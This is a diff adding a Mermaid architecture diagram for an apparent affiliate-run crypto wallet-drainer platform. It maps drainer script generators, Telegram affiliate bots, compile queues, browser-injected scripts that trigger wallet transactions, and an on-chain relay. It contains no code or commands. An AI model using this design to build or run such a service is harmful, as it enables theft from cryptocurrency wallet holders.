@@ -1,0 +1,72 @@
+flowchart LR
+  Browser["Dashboard / browser"]
+  Next["Next.js application"]
+  ConfigUI["Compile, operational, frontpage config APIs"]
+  JSON[("Filesystem JSON data/")]
+  Redis[("Redis")]
+  Registry["Static CONTRACT_REGISTRY\nabi/ + 3 contracts json artifacts"]
+  Discovery["Dynamic artifact discovery API"]
+  Project["Affiliate project/config records"]
+  CompileUI["Compile controls"]
+  CompileAPI["POST /api/compile"]
+  CompileQueue[("BullMQ compile queue")]
+  CompileWorker["compile.worker"]
+  CompileSvc["compileAffiliateProject /\nplatform compile path"]
+  Generators["SDK / ecosystem / drainer generators"]
+  Builds[("Generated files in .builds/")]
+  Static["public/generated-scripts/*.min.js"]
+  FrontAPI["POST /api/frontpage/compile"]
+  FrontCompiler["frontpage compiler"]
+  BrowserAction["Generated browser IIFE"]
+  Wallet["Browser wallet transaction"]
+  Tg["Telegram"]
+  TgHook["Platform webhook"]
+  TgQueue[("telegram-inbound queue")]
+  TgWorker["telegram.worker"]
+  Bot["processTelegramUpdate → command dispatcher"]
+  AffHook["Affiliate token webhook"]
+  AffBot["Synchronous affiliate command dispatcher"]
+  Notify[("notify queue")]
+  NotifyWorker["notify.worker"]
+  TelegramAPI["Telegram Bot API"]
+  RelayAPI["Synchronous /api/relay/batch"]
+  Chain["viem walletClient.writeContract"]
+  Kafka[("Kafka or in-memory event bus")]
+  Indexer["Optional indexer process"]
+  RelayQueue[("relay queue; no producer call site")]
+  RelayWorker["relay.worker stub"]
+
+  Browser --> Next
+  Next --> ConfigUI --> JSON
+  Browser --> CompileUI --> CompileAPI
+  Registry --> CompileUI
+  Discovery -. dynamic artifact API .-> Browser
+  CompileAPI -->|queue opt-in| CompileQueue --> CompileWorker
+  CompileAPI -->|sync default| CompileSvc
+  CompileWorker --> CompileSvc
+  CompileSvc --> Project
+  Project --> Redis
+  CompileSvc --> Generators --> Builds
+  CompileAPI --> Generators
+  FrontAPI --> FrontCompiler --> BrowserAction --> Wallet
+  FrontCompiler --> Builds
+
+  Tg --> TgHook
+  TgHook -->|queue enabled| TgQueue --> TgWorker --> Bot
+  TgHook -->|queue disabled| Bot
+  Bot -->|compile command + queue enabled| CompileQueue
+  Bot -->|compile command inline| CompileSvc
+  Bot --> Project
+  Bot --> TelegramAPI
+  Tg --> AffHook --> AffBot -->|inline compile| CompileSvc
+  AffBot --> Project
+  AffBot --> TelegramAPI
+  Browser -->|notify API, queue enabled| Notify --> NotifyWorker --> TelegramAPI
+
+  Browser --> RelayAPI --> Chain
+  RelayAPI --> Kafka
+  Indexer --> Redis
+  Indexer --> Kafka
+  RelayQueue -. producer call site not found .-> RelayWorker
+  RelayWorker -. logging/acceptance only .-> RelayQueue
+  Static -. static serving .-> Browser
